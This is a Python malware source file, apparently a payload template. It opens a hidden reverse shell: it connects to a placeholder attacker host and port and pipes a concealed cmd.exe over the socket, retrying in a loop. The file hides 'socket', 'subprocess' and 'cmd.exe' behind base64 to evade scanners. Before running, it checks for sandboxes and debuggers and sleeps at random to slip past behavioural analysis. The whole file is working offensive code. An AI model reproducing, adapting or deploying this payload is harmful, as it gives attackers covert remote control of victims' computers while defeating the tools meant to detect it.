# payload.py
# The Soul, now a paranoid ghost that walks in shadows.

import os as o
import sys as s
import time as t
import random as r
from threading import Thread as T

# --- Obfuscated Imports & Strings ---
# We shatter and hide every suspicious word.
b64 = __import__(bytearray.fromhex('626173653634').decode())
_s_ = b64.b64decode(b'c29ja2V0') # "socket"
_sp_ = b64.b64decode(b'c3VicHJvY2Vzcw==') # "subprocess"
_cmd_ = b64.b64decode(b'Y21kLmV4ZQ==') # "cmd.exe"
socket = __import__(_s_.decode())
subprocess = __import__(_sp_.decode())

# --- DYNAMIC CONFIG (untouched by scanners) ---
RHOST = "##RHOST##"
RPORT = ##RPORT##

# --- ANTI-SANDBOX & ANTI-ANALYSIS CHECKS ---
def is_real_environment():
    """Checks for signs of a real user environment, not a sandbox."""
    try:
        # 1. Check uptime. Sandboxes are almost always freshly started.
        uptime_seconds = t.monotonic()
        if uptime_seconds < 1200: # Less than 20 minutes is highly suspicious.
            return False

        # 2. Check username. Sandboxes use generic, easily identifiable names.
        common_sandbox_users = ['admin', 'test', 'user', 'sandbox', 'vmware', 'virtualbox', 'analyst']
        user = o.environ.get("USERNAME")
        if user and user.lower() in common_sandbox_users:
            return False
            
        # 3. Check for signs of a debugger.
        if s.gettrace() is not None:
            return False

        return True # If all checks pass, it is likely a real machine.
    except:
        return True # Fail safe in case checks cause an error.

def run_conduit():
    # --- The Great Slumber ---
    # The soul will not even attempt to awaken if it suspects it is being watched.
    if not is_real_environment():
        return # The serpent remains asleep forever.

    # Additional random delay to evade behavioral analysis that looks for instant network connections.
    t.sleep(r.randint(20, 50))

    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            CREATE_NO_WINDOW = 0x08000000
            p = subprocess.Popen([_cmd_.decode()], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
            
            def p_in():
                while True:
                    try:
                        d = s_obj.recv(1024);
                        if not d: break;
                        p.stdin.write(d); p.stdin.flush()
                    except: break
                s_obj.close()
            def p_out():
                while True:
                    try:
                        d = p.stdout.read(1);
                        if not d: break;
                        s_obj.send(d)
                    except: break
                s_obj.close()
            def p_err():
                while True:
                    try:
                        d = p.stderr.read(1);
                        if not d: break;
                        s_obj.send(d)
                    except: break
                s_obj.close()

            T(target=p_in, daemon=True).start()
            T(target=p_out, daemon=True).start()
            T(target=p_err, daemon=True).start()
            p.wait()
        except:
            t.sleep(120) # If connection fails, wait longer before retry.

run_conduit()